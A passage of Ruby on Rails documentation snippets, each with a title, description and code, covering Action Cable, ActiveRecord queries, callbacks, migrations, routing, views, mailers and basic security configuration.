// app/javascript/channels/chat_channel.js
import consumer from "./consumer"

const chatChannel = consumer.subscriptions.create({ channel: "ChatChannel", room: "Best Room" }, {
  received(data) {
    // data => { sent_by: "Paul", body: "This is a cool chat app." }
  }
})

chatChannel.send({ sent_by: "Paul", body: "This is a cool chat app." })

----------------------------------------

TITLE: Manual Database Connection Switching
DESCRIPTION: Using connected_to method to manually switch database connections based on role, allowing explicit control over which database is used regardless of request type.

LANGUAGE: ruby
CODE:
ActiveRecord::Base.connected_to(role: :reading) do
  # All code in this block will be connected to the reading role.
end

----------------------------------------

TITLE: Accessing Error Information from Error Objects
DESCRIPTION: This code demonstrates how to access detailed information from ActiveModel::Error objects, including the attribute, error type, and validation options.

LANGUAGE: ruby
CODE:
irb> error = person.errors.where(:name).last

irb> error.attribute
=> :name
irb> error.type
=> :too_short
irb> error.options[:count]
=> 3

----------------------------------------

TITLE: Using module to Route to Namespaced Controllers in Rails
DESCRIPTION: Routes /articles to Admin::ArticlesController without the /admin path prefix by using the scope module approach. This maintains the controller namespace while using standard paths.

LANGUAGE: ruby
CODE:
scope module: "admin" do
  resources :articles
end

----------------------------------------

TITLE: Using Custom Local Variables in Rails Partials
DESCRIPTION: Demonstrates how to use custom local variable names within partials using the :as option and how to pass additional arbitrary local variables with the locals hash.

LANGUAGE: erb
CODE:
<%= render partial: "product", collection: @products, as: :item %>

LANGUAGE: erb
CODE:
<%= render partial: "product", collection: @products,
           as: :item, locals: {title: "Products Page"} %>

----------------------------------------

TITLE: Generating a Mountable Rails Engine
DESCRIPTION: Command for generating a new mountable engine called 'blorgh' using the Rails plugin generator with the --mountable option.

LANGUAGE: bash
CODE:
$ rails plugin new blorgh --mountable

----------------------------------------

TITLE: Using Lambda for Conditional Validation in Rails
DESCRIPTION: Shows how to use lambda (a type of Proc) with a shortened syntax for conditional validation with the :unless option. This is useful for simple, one-line conditions.

LANGUAGE: ruby
CODE:
validates :password, confirmation: true, unless: -> { password.blank? }

----------------------------------------

TITLE: Configuring NGINX as a Reverse Proxy for Rails Applications
DESCRIPTION: This NGINX configuration sets up a reverse proxy for a Rails application running on an application server like Unicorn. It defines an upstream server listening on port 8080 and configures routing rules to proxy requests to the application server.

LANGUAGE: nginx
CODE:
upstream application_server {
  server 0.0.0.0:8080;
}

server {
  listen 80;
  server_name localhost;

  root /root/path/to/your_app/public;

  try_files $uri/index.html $uri.html @app;

  location @app {
    proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
    proxy_set_header Host $http_host;
    proxy_redirect off;
    proxy_pass http://application_server;
  }

  # some other configuration
}

----------------------------------------

TITLE: System Test for Article Creation Flow
DESCRIPTION: Test that simulates user interaction for creating a new article. It visits the index page, clicks on 'New Article', fills in the form fields, submits it, and verifies the creation was successful.

LANGUAGE: ruby
CODE:
test "should create Article" do
  visit articles_path

  click_on "New Article"

  fill_in "Title", with: "Creating an Article"
  fill_in "Body", with: "Created this article successfully!"

  click_on "Create Article"

  assert_text "Creating an Article"
end

----------------------------------------

TITLE: Assigning an Associated Object with belongs_to in Ruby on Rails
DESCRIPTION: Code example showing how to assign an author to a book. This sets the book's foreign key to match the author's primary key.

LANGUAGE: ruby
CODE:
@book.author = @author

----------------------------------------

TITLE: Testing Email Notifications in Product Model
DESCRIPTION: Creates a test to verify that emails are sent when a product comes back in stock. Sets up the product with zero inventory, then updates it and asserts that the correct number of emails are sent.

LANGUAGE: ruby
CODE:
require "test_helper"

class ProductTest < ActiveSupport::TestCase
  include ActionMailer::TestHelper

  test "sends email notifications when back in stock" do
    product = products(:tshirt)

    # Set product out of stock
    product.update(inventory_count: 0)

    assert_emails 2 do
      product.update(inventory_count: 99)
    end
  end
end

----------------------------------------

TITLE: Combining Create and Update Callbacks in Rails Model
DESCRIPTION: Implementation example showing how to use a combination of after_create and after_update callbacks for different behaviors based on whether a record is new or being updated. The example demonstrates sending confirmation emails for new records and notifying admins when critical information changes.

LANGUAGE: ruby
CODE:
class User < ApplicationRecord
  after_create :send_confirmation_email
  after_update :notify_admin_if_critical_info_updated

  private
    def send_confirmation_email
      UserMailer.confirmation_email(self).deliver_later
      Rails.logger.info("Confirmation email sent to: #{email}")
    end

    def notify_admin_if_critical_info_updated
      if saved_change_to_email? || saved_change_to_phone_number?
        AdminMailer.user_critical_info_updated(self).deliver_later
        Rails.logger.info("Notification sent to admin about critical info update for: #{email}")
      end
    end
end

----------------------------------------

TITLE: Configuring Models for Nested Attributes in Rails
DESCRIPTION: Shows how to set up model associations with accepts_nested_attributes_for to enable nested form handling. This allows a Person model to accept and manage attributes for associated Address records.

LANGUAGE: ruby
CODE:
class Person < ApplicationRecord
  has_many :addresses, inverse_of: :person
  accepts_nested_attributes_for :addresses
end

class Address < ApplicationRecord
  belongs_to :person
end

----------------------------------------

TITLE: Defining Root Routes in Rails
DESCRIPTION: Demonstrates different ways to define the root route (/) in a Rails application. The root route handles requests to the application's base URL.

LANGUAGE: ruby
CODE:
root to: "pages#main"
root "pages#main" # shortcut for the above

----------------------------------------

TITLE: Error Handling with Rails Error Reporter
DESCRIPTION: The improved approach using Rails' error reporter. This handles the specified exception type and reports it to all registered subscribers.

LANGUAGE: ruby
CODE:
Rails.error.handle(SomethingIsBroken) do
  do_something
end

----------------------------------------

TITLE: Adding Delete Button to Rails Product View
DESCRIPTION: ERB template code for adding a Delete button to the product show page. Uses button_to helper to create a form that submits a DELETE request to the product path, with a confirmation dialog using turbo_confirm data attribute.

LANGUAGE: erb
CODE:
<h1><%= @product.name %></h1>

<%= link_to "Back", products_path %>
<%= link_to "Edit", edit_product_path(@product) %>
<%= button_to "Delete", @product, method: :delete, data: { turbo_confirm: "Are you sure?" } %>

----------------------------------------

TITLE: Defining has_and_belongs_to_many Association in Rails Models
DESCRIPTION: Demonstrates how to set up a has_and_belongs_to_many association between Assembly and Part models, which requires a join table.

LANGUAGE: ruby
CODE:
class Assembly < ApplicationRecord
  has_and_belongs_to_many :parts
end

class Part < ApplicationRecord
  has_and_belongs_to_many :assemblies
end

----------------------------------------

TITLE: Using Custom Exceptions with Strict Validations in Rails
DESCRIPTION: Demonstrates how to specify a custom exception class for strict validations. This allows for more specific error handling by raising application-specific exceptions.

LANGUAGE: ruby
CODE:
class Person < ApplicationRecord
  validates :token, presence: true, uniqueness: true, strict: TokenGenerationException
end

----------------------------------------

TITLE: ProductsController with Show Action
DESCRIPTION: Expands the ProductsController to include a show action that finds and displays a single product based on the ID parameter from the URL.

LANGUAGE: ruby
CODE:
class ProductsController < ApplicationController
  def index
    @products = Product.all
  end

  def show
    @product = Product.find(params[:id])
  end
end

----------------------------------------

TITLE: Implementing Basic System Test for Articles Index Page
DESCRIPTION: Simple system test that visits the articles index page and asserts the presence of an h1 element with text 'Articles'. This is the foundation for article viewing tests.

LANGUAGE: ruby
CODE:
require "application_system_test_case"

class ArticlesTest < ApplicationSystemTestCase
  test "viewing the index" do
    visit articles_path
    assert_selector "h1", text: "Articles"
  end
end

----------------------------------------

TITLE: Implementing Initialize and Find Callbacks in Rails
DESCRIPTION: Example demonstrating how to implement after_initialize and after_find callbacks in Rails models. These callbacks are triggered when objects are instantiated or loaded from the database, allowing for automatic initialization and database retrieval operations.

LANGUAGE: ruby
CODE:
class User < ApplicationRecord
  after_initialize do |user|
    Rails.logger.info("You have initialized an object!")
  end

  after_find do |user|
    Rails.logger.info("You have found an object!")
  end
end

----------------------------------------

TITLE: Implementing Destroy Callbacks in Rails Model
DESCRIPTION: Example showing how to implement before_destroy, around_destroy, and after_destroy callbacks in a User model. These callbacks check conditions before destroying, log the destruction process, and send notifications after the record is destroyed.

LANGUAGE: ruby
CODE:
class User < ApplicationRecord
  before_destroy :check_admin_count
  around_destroy :log_destroy_operation
  after_destroy :notify_users

  private
    def check_admin_count
      if admin? && User.where(role: "admin").count == 1
        throw :abort
      end
      Rails.logger.info("Checked the admin count")
    end

    def log_destroy_operation
      Rails.logger.info("About to destroy user with ID #{id}")
      yield
      Rails.logger.info("User with ID #{id} destroyed successfully")
    end

    def notify_users
      UserMailer.deletion_email(self).deliver_later
      Rails.logger.info("Notification sent to other users about user deletion")
    end
end

----------------------------------------

TITLE: Adding NOT NULL Constraint to Existing Column
DESCRIPTION: Migration that adds a NOT NULL constraint to an existing column using the change_column_null method. This affects all existing records in the table.

LANGUAGE: ruby
CODE:
change_column_null :products, :name, false

----------------------------------------

TITLE: Generating a Scaffold in Rails
DESCRIPTION: Demonstrates creating a complete resource scaffold for a HighScore model with string and integer attributes. The scaffold generates models, views, controllers, routes, and tests.

LANGUAGE: bash
CODE:
$ bin/rails generate scaffold HighScore game:string score:integer
    invoke  active_record
    create    db/migrate/20190416145729_create_high_scores.rb
    create    app/models/high_score.rb
    invoke    test_unit
    create      test/models/high_score_test.rb
    create      test/fixtures/high_scores.yml
    invoke  resource_route
     route    resources :high_scores
    invoke  scaffold_controller
    create    app/controllers/high_scores_controller.rb
    invoke    erb
    create      app/views/high_scores
    create      app/views/high_scores/index.html.erb
    create      app/views/high_scores/edit.html.erb
    create      app/views/high_scores/show.html.erb
    create      app/views/high_scores/new.html.erb
    create      app/views/high_scores/_form.html.erb
    invoke    test_unit
    create      test/controllers/high_scores_controller_test.rb
    create      test/system/high_scores_test.rb
    invoke    helper
    create      app/helpers/high_scores_helper.rb
    invoke      test_unit
    invoke    jbuilder
    create      app/views/high_scores/index.json.jbuilder
    create      app/views/high_scores/show.json.jbuilder
    create      app/views/high_scores/_high_score.json.jbuilder

----------------------------------------

TITLE: Implementing Exception Handling for Action Cable Channels in Rails
DESCRIPTION: Channel-specific exception handling using rescue_from. This allows channels to handle specific errors and respond accordingly, such as by broadcasting error messages back to subscribers.

LANGUAGE: ruby
CODE:
# app/channels/chat_channel.rb
class ChatChannel < ApplicationCable::Channel
  rescue_from "MyError", with: :deliver_error_message

  private
    def deliver_error_message(e)
      # broadcast_to(...)
    end
end

----------------------------------------

TITLE: Russian Doll Caching in Rails Views
DESCRIPTION: This code illustrates Russian doll caching where cached fragments are nested inside other cached fragments. The outer fragment caches the product while the inner fragment caches individual games.

LANGUAGE: html+erb
CODE:
<% cache product do %>
  <%= render product.games %>
<% end %>

LANGUAGE: html+erb
CODE:
<% cache game do %>
  <%= render game %>
<% end %>

----------------------------------------

TITLE: Using redirect_to in Rails Controllers
DESCRIPTION: Basic example of redirecting to another URL in Rails using redirect_to, which sends a new HTTP request to a different URL rather than rendering a view directly.

LANGUAGE: ruby
CODE:
redirect_to photos_url

----------------------------------------

TITLE: Configuring Feature-Policy/Permissions-Policy Header in Rails
DESCRIPTION: Defines a Feature-Policy response header to allow or block browser features. This initializer configures which browser features are allowed and for which origins. Note that Feature-Policy has been renamed to Permissions-Policy but the implementation still uses the older name.

LANGUAGE: ruby
CODE:
# config/initializers/permissions_policy.rb
Rails.application.config.permissions_policy do |policy|
  policy.camera      :none
  policy.gyroscope   :none
  policy.microphone  :none
  policy.usb         :none
  policy.fullscreen  :self
  policy.payment     :self, "https://secure.example.com"
end

----------------------------------------

TITLE: Implementing Controller Logging for Debugging in Rails
DESCRIPTION: Shows a complete example of a controller method with enhanced logging to track the article creation process, demonstrating proper logging practices.

LANGUAGE: ruby
CODE:
class ArticlesController < ApplicationController
  # ...

  def create
    @article = Article.new(article_params)
    logger.debug "New article: #{@article.attributes.inspect}"
    logger.debug "Article should be valid: #{@article.valid?}"

    if @article.save
      logger.debug "The article was saved and now the user is going to be redirected..."
      redirect_to @article, notice: 'Article was successfully created.'
    else
      render :new, status: :unprocessable_entity
    end
  end

  # ...

  private
    def article_params
      params.expect(article: [:title, :body, :published])
    end
end

----------------------------------------

TITLE: Creating a New Rails Application with rails new
DESCRIPTION: Shows how to create a new Rails application using the rails new command. This generates the entire Rails directory structure with all the necessary files to run a Rails application.

LANGUAGE: bash
CODE:
$ rails new my_app
     create
     create  README.md
     create  Rakefile
     create  config.ru
     create  .gitignore
     create  Gemfile
     create  app
     ...
     create  tmp/cache
     ...
        run  bundle install

----------------------------------------

TITLE: Adding File Upload Field to Rails Form
DESCRIPTION: Shows how to add a file upload field to a product form using form.file_field. The accept attribute restricts uploads to image file types only.

LANGUAGE: erb
CODE:
<div>
  <%= form.label :featured_image, style: "display: block" %>
  <%= form.file_field :featured_image, accept: "image/*" %>
</div>

----------------------------------------

TITLE: Specifying Conditions on Joined Tables with Hash in ActiveRecord
DESCRIPTION: Demonstrates using a nested hash syntax to specify conditions on joined tables. This provides a cleaner alternative to string conditions, finding customers who placed orders within a specific time range.

LANGUAGE: ruby
CODE:
time_range = (Time.now.midnight - 1.day)..Time.now.midnight
Customer.joins(:orders).where(orders: { created_at: time_range }).distinct

----------------------------------------

TITLE: Merging Scopes and Conditions in Rails Queries
DESCRIPTION: This snippet demonstrates how scopes are merged using AND conditions by default. It shows how to mix scopes with where conditions and how default_scope interacts with other query methods. It also shows how to use merge when you want the last condition to take precedence.

LANGUAGE: ruby
CODE:
class Book < ApplicationRecord
  scope :in_print, -> { where(out_of_print: false) }
  scope :out_of_print, -> { where(out_of_print: true) }

  scope :recent, -> { where(year_published: 50.years.ago.year..) }
  scope :old, -> { where(year_published: ...50.years.ago.year) }
end

LANGUAGE: irb
CODE:
irb> Book.out_of_print.old
SELECT books.* FROM books WHERE books.out_of_print = 'true' AND books.year_published < 1969

LANGUAGE: irb
CODE:
irb> Book.in_print.where(price: ...100)
SELECT books.* FROM books WHERE books.out_of_print = 'false' AND books.price < 100

LANGUAGE: irb
CODE:
irb> Book.in_print.merge(Book.out_of_print)
SELECT books.* FROM books WHERE books.out_of_print = true

LANGUAGE: ruby
CODE:
class Book < ApplicationRecord
  default_scope { where(year_published: 50.years.ago.year..) }

  scope :in_print, -> { where(out_of_print: false) }
  scope :out_of_print, -> { where(out_of_print: true) }
end

LANGUAGE: irb
CODE:
irb> Book.all
SELECT books.* FROM books WHERE (year_published >= 1969)

irb> Book.in_print
SELECT books.* FROM books WHERE (year_published >= 1969) AND books.out_of_print = false

irb> Book.where('price > 50')
SELECT books.* FROM books WHERE (year_published >= 1969) AND (price > 50)

----------------------------------------

TITLE: Defining Routes with Request-Based Constraints in Rails
DESCRIPTION: Constrains a route based on request properties like subdomain. The route will only match when the request meets the specified constraints.

LANGUAGE: ruby
CODE:
get "photos", to: "photos#index", constraints: { subdomain: "admin" }

----------------------------------------

TITLE: Assigning a collection in has_many :through relationship in Rails
DESCRIPTION: Example of assigning a list of patients to a physician in a has_many :through relationship. Rails will automatically create or delete join records as needed.

LANGUAGE: ruby
CODE:
physician.patients = patients

----------------------------------------

TITLE: Using permit! Method in Rails
DESCRIPTION: This snippet shows how to use the permit! method to permit an entire hash of parameters without checking the values. This method should be used with extreme caution as it allows all attributes to be mass-assigned.

LANGUAGE: ruby
CODE:
params = ActionController::Parameters.new(id: 1, admin: "true")
=> #<ActionController::Parameters {"id"=>1, "admin"=>"true"} permitted: false>
params.permit!
=> #<ActionController::Parameters {"id"=>1, "admin"=>"true"} permitted: true>

----------------------------------------

TITLE: HTML Template for Welcome Email
DESCRIPTION: An HTML ERB template for the welcome email view. It uses instance variables set in the mailer action to personalize the email with the user's information and includes a login link.

LANGUAGE: html+erb
CODE:
<h1>Welcome to example.com, <%= @user.name %></h1>
<p>
  You have successfully signed up to example.com,
  your username is: <%= @user.login %>.<br>
</p>
<p>
  To login to the site, just follow this link: <%= link_to 'login', login_url %>.
</p>
<p>Thanks for joining and have a great day!</p>

----------------------------------------

TITLE: Creating Empty Relations with none in ActiveRecord
DESCRIPTION: Demonstrates how to use the 'none' method to create a chainable relation that contains no records, useful for scenarios where a method must return a relation but may have no results.

LANGUAGE: ruby
CODE:
Book.none # returns an empty Relation and fires no queries.

LANGUAGE: ruby
CODE:
# The highlighted_reviews method below is expected to always return a Relation.
Book.first.highlighted_reviews.average(:rating)
# => Returns average rating of a book

class Book
  # Returns reviews if there are at least 5,
  # else consider this as non-reviewed book
  def highlighted_reviews
    if reviews.count >= 5
      reviews
    else
      Review.none # Does not meet minimum threshold yet
    end
  end
end

----------------------------------------

TITLE: Defining a Model with Composite Primary Key and Foreign Keys for Fixtures
DESCRIPTION: Shows how to define a BookOrder model with a composite primary key and composite foreign keys for use with fixtures.

LANGUAGE: ruby
CODE:
class BookOrder < ApplicationRecord
  self.primary_key = [:shop_id, :id]
  belongs_to :order, foreign_key: [:shop_id, :order_id]
  belongs_to :book, foreign_key: [:author_id, :book_id]
end

----------------------------------------

TITLE: Creating Mobile-Specific System Test Configuration
DESCRIPTION: Custom test case configuration for mobile screen testing. This creates a new base class that sets up Selenium with Chrome at mobile screen dimensions (375x667).

LANGUAGE: ruby
CODE:
require "test_helper"

class MobileSystemTestCase < ActionDispatch::SystemTestCase
  driven_by :selenium, using: :chrome, screen_size: [375, 667]
end

----------------------------------------

TITLE: Setting Up Parameter Filtering in Rails for Security
DESCRIPTION: Configuration for filtering sensitive parameters from logs and object inspection in Rails. This prevents sensitive data like passwords, emails, and tokens from being exposed in application logs.

LANGUAGE: ruby
CODE:
Rails.application.config.filter_parameters += [
  :passw, :email, :secret, :token, :_key, :crypt, :salt, :certificate, :otp, :ssn, :cvv, :cvc
]

----------------------------------------

TITLE: Implementing Default Scopes in Rails Models
DESCRIPTION: This snippet shows how to define a default scope that is applied to all queries on a model. It demonstrates both the simple approach and defining default_scope as a class method, along with its behavior during record creation.

LANGUAGE: ruby
CODE:
class Book < ApplicationRecord
  default_scope { where(out_of_print: false) }
end

LANGUAGE: sql
CODE:
SELECT * FROM books WHERE (out_of_print = false)

LANGUAGE: ruby
CODE:
class Book < ApplicationRecord
  def self.default_scope
    # Should return an ActiveRecord::Relation.
  end
end

LANGUAGE: irb
CODE:
irb> Book.new
=> #<Book id: nil, out_of_print: false>
irb> Book.unscoped.new
=> #<Book id: nil, out_of_print: nil>

LANGUAGE: ruby
CODE:
class Book < ApplicationRecord
  default_scope { where("out_of_print = ?", false) }
end

LANGUAGE: irb
CODE:
irb> Book.new
=> #<Book id: nil, out_of_print: nil>

----------------------------------------

TITLE: Default HTTP Security Headers Configuration in Rails
DESCRIPTION: This configuration shows the default HTTP security headers that Rails sets on all responses. These headers help protect against various attacks like clickjacking, MIME type sniffing, and cross-domain embedding.

LANGUAGE: ruby
CODE:
config.action_dispatch.default_headers = {
  "X-Frame-Options" => "SAMEORIGIN",
  "X-XSS-Protection" => "0",
  "X-Content-Type-Options" => "nosniff",
  "X-Permitted-Cross-Domain-Policies" => "none",
  "Referrer-Policy" => "strict-origin-when-cross-origin"
}

----------------------------------------

TITLE: Implementing Terms of Service Acceptance Validation
DESCRIPTION: Example of using the acceptance validator for terms of service. This is typically used for checkboxes on forms that users must accept.

LANGUAGE: ruby
CODE:
class Person < ApplicationRecord
  validates :terms_of_service, acceptance: true
end

----------------------------------------

TITLE: Using content_for in Rails Views
DESCRIPTION: Shows how to use the content_for method to insert content into named yield blocks in layouts. Useful for inserting page-specific elements into the head or other layout regions.

LANGUAGE: html+erb
CODE:
<% content_for :head do %>
  <title>A simple page</title>
<% end %>

<p>Hello, Rails!</p>

LANGUAGE: html+erb
CODE:
<html>
  <head>
    <title>A simple page</title>
  </head>
  <body>
    <p>Hello, Rails!</p>
  </body>
</html>

----------------------------------------

TITLE: Implementing around_action callback using a class in Rails
DESCRIPTION: This more complex example demonstrates implementing an around_action callback using a separate class. This approach is useful for complex callbacks, such as this one which measures and logs the execution time of controller actions.

LANGUAGE: ruby
CODE:
class ApplicationController < ActionController::Base
  around_action ActionDurationCallback
end

class ActionDurationCallback
  def self.around(controller)
    start_time = Time.now
    yield # This executes the action
    end_time = Time.now

    duration = end_time - start_time
    Rails.logger.info "Action #{controller.action_name} from controller #{controller.controller_name} took #{duration.round(2)} seconds to execute."
  end
end

----------------------------------------

TITLE: Using fields_for Helper for Nested Models in Rails
DESCRIPTION: Demonstrates using fields_for to create form fields for an associated model (ContactDetail) within a Person form. This allows submitting data for both models in a single form.

LANGUAGE: erb
CODE:
<%= form_with model: @person do |person_form| %>
  <%= person_form.text_field :name %>
  <%= fields_for :contact_detail, @person.contact_detail do |contact_detail_form| %>
    <%= contact_detail_form.text_field :phone_number %>
  <% end %>
<% end %>

----------------------------------------

TITLE: Creating a Table with create_table
DESCRIPTION: Basic example of creating a table using the create_table migration method. This creates a products table with a name column.

LANGUAGE: ruby
CODE:
create_table :products do |t|
  t.string :name
end

----------------------------------------

TITLE: Accessing nested collection through has_many :through in Rails
DESCRIPTION: Demonstrates how to access paragraphs directly from a document using the has_many :through association, which simplifies code compared to manual traversal.

LANGUAGE: ruby
CODE:
@document.paragraphs

----------------------------------------

TITLE: Using tag Helper in Rails for HTML Generation
DESCRIPTION: Examples of using the tag helper to generate arbitrary HTML tags programmatically, with support for content and attributes. This flexible helper can create any HTML element needed.

LANGUAGE: ruby
CODE:
tag.h1 "All titles fit to print"
# => <h1>All titles fit to print</h1>

tag.div "Hello, world!"
# => <div>Hello, world!</div>

----------------------------------------

TITLE: Configuring Rescue Responses with Hash Assignment in Rails
DESCRIPTION: Example of setting a custom exception to HTTP status mapping in Rails' rescue_responses configuration. This code demonstrates how to assign a custom authentication error to return an HTTP unauthorized status.

LANGUAGE: ruby
CODE:
# It's good to use #[]= or #merge! to respect the default values
config.action_dispatch.rescue_responses["MyAuthenticationError"] = :unauthorized

----------------------------------------

TITLE: Replacing Group Conditions with regroup in ActiveRecord
DESCRIPTION: Shows how to use the 'regroup' method to replace an existing group condition instead of combining multiple group clauses together.

LANGUAGE: ruby
CODE:
Book.group(:author).regroup(:id)

LANGUAGE: sql
CODE:
SELECT * FROM books GROUP BY id

LANGUAGE: ruby
CODE:
Book.group(:author).group(:id)

LANGUAGE: sql
CODE:
SELECT * FROM books GROUP BY author, id

----------------------------------------

TITLE: Initializing Secure Token in Rails Models
DESCRIPTION: This snippet demonstrates how has_secure_token generates values when the model is initialized, which is the default behavior when config.active_record.generate_secure_token_on is set to :initialize.

LANGUAGE: ruby
CODE:
class User < ApplicationRecord
  has_secure_token
end

record = User.new
record.token # => "fwZcXX6SkJBJRogzMdciS7wf"

----------------------------------------

TITLE: Creating an Appearance Channel Subscription in JavaScript
DESCRIPTION: Implements a client-side appearance channel subscription that tracks user focus and visibility. This code updates the user's status based on browser window events and document visibility.

LANGUAGE: javascript
CODE:
// app/javascript/channels/appearance_channel.js
import consumer from "./consumer"

consumer.subscriptions.create("AppearanceChannel", {
  // Called once when the subscription is created.
  initialized() {
    this.update = this.update.bind(this)
  },

  // Called when the subscription is ready for use on the server.
  connected() {
    this.install()
    this.update()
  },

  // Called when the WebSocket connection is closed.
  disconnected() {
    this.uninstall()
  },

  // Called when the subscription is rejected by the server.
  rejected() {
    this.uninstall()
  },

  update() {
    this.documentIsActive ? this.appear() : this.away()
  },

  appear() {
    // Calls `AppearanceChannel#appear(data)` on the server.
    this.perform("appear", { appearing_on: this.appearingOn })
  },

  away() {
    // Calls `AppearanceChannel#away` on the server.
    this.perform("away")
  },

  install() {
    window.addEventListener("focus", this.update)
    window.addEventListener("blur", this.update)
    document.addEventListener("turbo:load", this.update)
    document.addEventListener("visibilitychange", this.update)
  },

  uninstall() {
    window.removeEventListener("focus", this.update)
    window.removeEventListener("blur", this.update)
    document.removeEventListener("turbo:load", this.update)
    document.removeEventListener("visibilitychange", this.update)
  },

  get documentIsActive() {
    return document.visibilityState === "visible" && document.hasFocus()
  },

  get appearingOn() {
    const element = document.querySelector("[data-appearing-on]")
    return element ? element.getAttribute("data-appearing-on") : null
  }
})

----------------------------------------

TITLE: Using where.missing to Filter Records without Associations
DESCRIPTION: Demonstrates using where.missing to find records that have no associated records. This query finds all customers who have not made any reviews, using a LEFT OUTER JOIN with an IS NULL condition.

LANGUAGE: ruby
CODE:
Customer.where.missing(:reviews)

LANGUAGE: sql
CODE:
SELECT customers.* FROM customers
LEFT OUTER JOIN reviews ON reviews.customer_id = customers.id
WHERE reviews.id IS NULL

----------------------------------------

TITLE: Implementing before_action callback using a block in Rails
DESCRIPTION: This snippet demonstrates how to use a block directly with the before_action method in Rails controllers. The callback receives the controller as an argument and can access controller methods using send for private methods.

LANGUAGE: ruby
CODE:
class ApplicationController < ActionController::Base
  before_action do |controller|
    unless controller.send(:logged_in?)
      flash[:error] = "You must be logged in to access this section"
      redirect_to new_login_url
    end
  end
end

----------------------------------------

TITLE: Creating a Database Migration in Rails
DESCRIPTION: Example of a Rails migration that creates a new publications table with various column types including string, text, references, and boolean. Demonstrates database schema management.

LANGUAGE: ruby
CODE:
class CreatePublications < ActiveRecord::Migration[8.1]
  def change
    create_table :publications do |t|
      t.string :title
      t.text :description
      t.references :publication_type
      t.references :publisher, polymorphic: true
      t.boolean :single_issue

      t.timestamps
    end
  end
end

----------------------------------------

TITLE: Permitting Array Parameters in Rails
DESCRIPTION: This snippet shows how to permit an array of scalar values in parameters. By mapping the key to an empty array, all elements of the array are permitted if they are scalar values.

LANGUAGE: ruby
CODE:
params = ActionController::Parameters.new(tags: ["rails", "parameters"])
=> #<ActionController::Parameters {"tags"=>["rails", "parameters"]} permitted: false>
params.permit(tags: [])
=> #<ActionController::Parameters {"tags"=>["rails", "parameters"]} permitted: true>

----------------------------------------

TITLE: Generated Multi-Column Addition Migration in Ruby on Rails
DESCRIPTION: This migration adds two columns (part_number and price) to the products table. It demonstrates how Rails handles multiple column specifications in a single migration generator command.

LANGUAGE: ruby
CODE:
class AddDetailsToProducts < ActiveRecord::Migration[8.1]
  def change
    add_column :products, :part_number, :string
    add_column :products, :price, :decimal
  end
end

----------------------------------------

TITLE: Broadcasting a Message to a Channel in Ruby
DESCRIPTION: Demonstrates how to broadcast a message to a specific channel using ActionCable.server.broadcast. This sends data to all subscribers of the 'chat_Best Room' broadcasting.

LANGUAGE: ruby
CODE:
ActionCable.server.broadcast("chat_Best Room", { body: "This Room is Best Room." })

----------------------------------------

TITLE: Implementing Strong ETags in Rails Controller
DESCRIPTION: Code example showing how to generate a strong ETag in a Rails controller action using the fresh_when method. The example sets both last_modified and strong_etag parameters based on a Product model instance.

LANGUAGE: ruby
CODE:
class ProductsController < ApplicationController
  def show
    @product = Product.find(params[:id])
    fresh_when last_modified: @product.published_at.utc, strong_etag: @product
  end
end

----------------------------------------

TITLE: Using a Custom FormBuilder in a Form
DESCRIPTION: Demonstrates how to specify a custom FormBuilder class when creating a form with form_with. This approach uses the builder option to tell Rails to use the LabellingFormBuilder class for this form.

LANGUAGE: erb
CODE:
<%= form_with model: @person, builder: LabellingFormBuilder do |form| %>
  <%= form.text_field :first_name %>
<% end %>

----------------------------------------

TITLE: Dynamic Inclusion Validation Using Proc in Rails
DESCRIPTION: Shows how to implement dynamic inclusion validation using a proc that returns an enumerable set. This approach allows the valid values to be determined at runtime.

LANGUAGE: ruby
CODE:
class Coffee < ApplicationRecord
  validates :size, inclusion: { in: ->(coffee) { coffee.available_sizes } }

  def available_sizes
    %w(small medium large extra_large)
  end
end

----------------------------------------

TITLE: Creating Edit Product View with Form Partial in Rails ERB
DESCRIPTION: Implements the edit product view using the same form partial as the new product view, demonstrating the reusability of partials in Rails views.

LANGUAGE: erb
CODE:
<h1>Edit product</h1>

<%= render "form", product: @product %>
<%= link_to "Cancel", @product %>

----------------------------------------

TITLE: Passing Objects to Partials in Rails
DESCRIPTION: Demonstrates different ways to pass object instances to partials, including using the :object option and the shorthand syntax for model instances.

LANGUAGE: erb
CODE:
<%= render partial: "customer", object: @new_customer %>

LANGUAGE: erb
CODE:
<%= render @customer %>

----------------------------------------

TITLE: Setting Custom Configuration in Rails
DESCRIPTION: Demonstrates how to define custom configuration parameters using config.x namespace for nested configurations and direct config for single level configurations.

LANGUAGE: ruby
CODE:
config.x.payment_processing.schedule = :daily
config.x.payment_processing.retries  = 3
config.super_debugger = true

----------------------------------------

TITLE: Preloading Rich Text Content to Avoid N+1 Queries
DESCRIPTION: Ruby code demonstrating how to use named scopes to preload ActionText::RichText models and their embedded attachments.

LANGUAGE: ruby
CODE:
Article.all.with_rich_text_content # Preload the body without attachments.
Article.all.with_rich_text_content_and_embeds # Preload both body and attachments.

----------------------------------------

TITLE: Cascading Callbacks through Model Associations
DESCRIPTION: Demonstrates how callbacks can cascade through model associations. When a User is destroyed, the dependent: :destroy option triggers the after_destroy callback on associated Article objects.

LANGUAGE: ruby
CODE:
class User < ApplicationRecord
  has_many :articles, dependent: :destroy
end

class Article < ApplicationRecord
  after_destroy :log_destroy_action

  def log_destroy_action
    Rails.logger.info("Article destroyed")
  end
end

----------------------------------------

TITLE: Creating OR Conditions Between Relations in Rails
DESCRIPTION: Demonstrates how to create OR conditions between two separate query relations to find records matching either set of conditions.

LANGUAGE: ruby
CODE:
Customer.where(last_name: "Smith").or(Customer.where(orders_count: [1, 3, 5]))

----------------------------------------

TITLE: Template for Initializer Generator
DESCRIPTION: Template file content for the initializer generator that will be copied to the destination file.

LANGUAGE: ruby
CODE:
# Add initialization content here

----------------------------------------

TITLE: Using after_action Callbacks in Action Mailer
DESCRIPTION: Example of using after_action callbacks in a mailer to modify delivery options, conditionally prevent delivery, and set custom headers after the email is composed but before it's delivered.

LANGUAGE: ruby
CODE:
class UserMailer < ApplicationMailer
  before_action { @business, @user = params[:business], params[:user] }

  after_action :set_delivery_options,
               :prevent_delivery_to_guests,
               :set_business_headers

  def feedback_message
  end

  def campaign_message
  end

  private
    def set_delivery_options
      # You have access to the mail instance,
      # @business and @user instance variables here
      if @business && @business.has_smtp_settings?
        mail.delivery_method.settings.merge!(@business.smtp_settings)
      end
    end

    def prevent_delivery_to_guests
      if @user && @user.guest?
        mail.perform_deliveries = false
      end
    end

    def set_business_headers
      if @business
        headers["X-SMTPAPI-CATEGORY"] = @business.code
      end
    end
end

----------------------------------------

TITLE: Testing Action Cable Connections in Rails
